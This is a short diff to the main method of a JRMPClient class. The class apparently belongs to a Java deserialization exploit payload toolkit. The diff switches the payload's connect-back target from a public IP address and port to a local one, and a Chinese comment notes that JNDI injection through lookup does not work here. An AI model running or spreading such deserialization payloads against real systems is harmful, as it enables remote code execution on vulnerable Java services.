@@ -85,8 +85,8 @@ public class JRMPClient extends PayloadRunner implements ObjectPayload<Registry>
     public static void main ( final String[] args ) throws Exception {
         Thread.currentThread().setContextClassLoader(JRMPClient.class.getClassLoader());
         //PayloadRunner.run(JRMPClient.class, args);
-        PayloadRunner.run(JRMPClient.class, new String[]{"39.106.143.48:9989"});
-        //PayloadRunner.run(JRMPClient.class, new String[]{"127.0.0.1:1097"}); //有lookup不? 可以JNDI注入? @angelwhu
+        //PayloadRunner.run(JRMPClient.class, new String[]{"39.106.143.48:9989"});
+        PayloadRunner.run(JRMPClient.class, new String[]{"127.0.0.1:1097"}); //有lookup不? 可以JNDI注入?不行，没有lookup～ @angelwhu
     }
 
 }
